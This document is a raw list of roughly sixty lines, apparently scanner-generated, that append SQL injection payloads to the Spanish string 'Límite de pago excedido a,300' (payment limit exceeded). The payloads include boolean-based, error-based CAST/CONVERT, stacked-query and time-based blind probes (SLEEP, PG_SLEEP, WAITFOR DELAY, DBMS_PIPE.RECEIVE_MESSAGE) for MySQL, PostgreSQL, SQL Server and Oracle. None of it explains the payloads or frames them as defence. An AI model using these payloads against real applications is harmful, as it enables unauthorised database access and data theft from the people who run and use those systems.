Límite de pago excedido a,300(,\'.\")(.,,
Límite de pago excedido a,300\'SGJNBU<\'\">Mrbcns
Límite de pago excedido a,300) AND 6695=8867 AND (2137=2137
Límite de pago excedido a,300) AND 5926=5926 AND (5582=5582
Límite de pago excedido a,300 AND 3952=5839
Límite de pago excedido a,300 AND 5926=5926
Límite de pago excedido a,300 AND 3897=2147-- ebDU
Límite de pago excedido a,300 AND 5926=5926-- FEzN
Límite de pago excedido a,300\') AND 8271=7776 AND (\'fBnj\'=\'fBnj
Límite de pago excedido a,300\') AND 5926=5926 AND (\'qBLx\'=\'qBLx
Límite de pago excedido a,300\' AND 6481=5065 AND \'aTjP\'=\'aTjP
Límite de pago excedido a,300\' AND 5926=5926 AND \'Vlwh\'=\'Vlwh
Límite de pago excedido a,300%\' AND 4048=8475 AND \'%\'=\'
Límite de pago excedido a,300%\' AND 5926=5926 AND \'%\'=\'
Límite de pago excedido a,300) AND 6530=CAST((CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (6530=6530) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(113)||CHR(113)) AS NUMERIC) AND (9577=9577
Límite de pago excedido a,300 AND 6530=CAST((CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (6530=6530) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(113)||CHR(113)) AS NUMERIC)
Límite de pago excedido a,300 AND 6530=CAST((CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (6530=6530) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(113)||CHR(113)) AS NUMERIC)-- vCIC
Límite de pago excedido a,300\') AND 6530=CAST((CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (6530=6530) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(113)||CHR(113)) AS NUMERIC) AND (\'CqSa\'=\'CqSa
Límite de pago excedido a,300\' AND 6530=CAST((CHR(113)||CHR(107)||CHR(107)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (6530=6530) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(120)||CHR(113)||CHR(113)) AS NUMERIC) AND \'azdZ\'=\'azdZ
Límite de pago excedido a,300) AND 5323=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (5323=5323) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(113)+CHAR(113))) AND (4226=4226
Límite de pago excedido a,300 AND 5323=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (5323=5323) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(113)+CHAR(113)))
Límite de pago excedido a,300 AND 5323=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (5323=5323) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(113)+CHAR(113)))-- TxLi
Límite de pago excedido a,300\') AND 5323=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (5323=5323) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(113)+CHAR(113))) AND (\'wBCH\'=\'wBCH
Límite de pago excedido a,300\' AND 5323=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(107)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (5323=5323) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(120)+CHAR(113)+CHAR(113))) AND \'GypT\'=\'GypT
Límite de pago excedido a,300);SELECT SLEEP(5)#
Límite de pago excedido a,300;SELECT SLEEP(5)#
Límite de pago excedido a,300\');SELECT SLEEP(5)#
Límite de pago excedido a,300\';SELECT SLEEP(5)#
Límite de pago excedido a,300%\';SELECT SLEEP(5)#
Límite de pago excedido a,300);SELECT PG_SLEEP(5)--
Límite de pago excedido a,300;SELECT PG_SLEEP(5)--
Límite de pago excedido a,300\');SELECT PG_SLEEP(5)--
Límite de pago excedido a,300\';SELECT PG_SLEEP(5)--
Límite de pago excedido a,300%\';SELECT PG_SLEEP(5)--
Límite de pago excedido a,300);WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300;WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300\');WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300\';WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300%\';WAITFOR DELAY \'0:0:5\'--
Límite de pago excedido a,300) AND SLEEP(5) AND (4160=4160
Límite de pago excedido a,300 AND SLEEP(5)
Límite de pago excedido a,300 AND SLEEP(5)-- Nvfx
Límite de pago excedido a,300\') AND SLEEP(5) AND (\'VTlw\'=\'VTlw
Límite de pago excedido a,300\' AND SLEEP(5) AND \'OTmn\'=\'OTmn
Límite de pago excedido a,300%\' AND SLEEP(5) AND \'%\'=\'
Límite de pago excedido a,300) AND 8374=(SELECT 8374 FROM PG_SLEEP(5)) AND (2540=2540
Límite de pago excedido a,300 AND 8374=(SELECT 8374 FROM PG_SLEEP(5))
Límite de pago excedido a,300 AND 8374=(SELECT 8374 FROM PG_SLEEP(5))-- TvHM
Límite de pago excedido a,300\') AND 8374=(SELECT 8374 FROM PG_SLEEP(5)) AND (\'ttMc\'=\'ttMc
Límite de pago excedido a,300\' AND 8374=(SELECT 8374 FROM PG_SLEEP(5)) AND \'QOVe\'=\'QOVe
Límite de pago excedido a,300%\' AND 8374=(SELECT 8374 FROM PG_SLEEP(5)) AND \'%\'=\'
Límite de pago excedido a,300) WAITFOR DELAY \'0:0:5\' AND (4448=4448
Límite de pago excedido a,300 WAITFOR DELAY \'0:0:5\'
Límite de pago excedido a,300 WAITFOR DELAY \'0:0:5\'-- DDGe
Límite de pago excedido a,300\') WAITFOR DELAY \'0:0:5\' AND (\'IbwG\'=\'IbwG
Límite de pago excedido a,300\' WAITFOR DELAY \'0:0:5\' AND \'MyDH\'=\'MyDH
Límite de pago excedido a,300%\' WAITFOR DELAY \'0:0:5\' AND \'%\'=\'
Límite de pago excedido a,300) AND 6981=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(114)||CHR(68)||CHR(111),5) AND (2406=2406
Límite de pago excedido a,300 AND 6981=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(114)||CHR(68)||CHR(111),5)
Límite de pago excedido a,300 AND 6981=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(114)||CHR(68)||CHR(111),5)-- kYWR
Límite de pago excedido a,300\') AND 6981=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(114)||CHR(68)||CHR(111),5) AND (\'AqBu\'=\'AqBu
Límite de pago excedido a,300\' AND 6981=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(114)||CHR(68)||CHR(111),5) AND \'FUtO\'=\'FUtO
Límite de pago excedido a,300%\' AND 6981=DBMS_PIPE.RECEIVE_MESSAGE(CHR(88)||CHR(114)||CHR(68)||CHR(111),5) AND \'%\'=\'
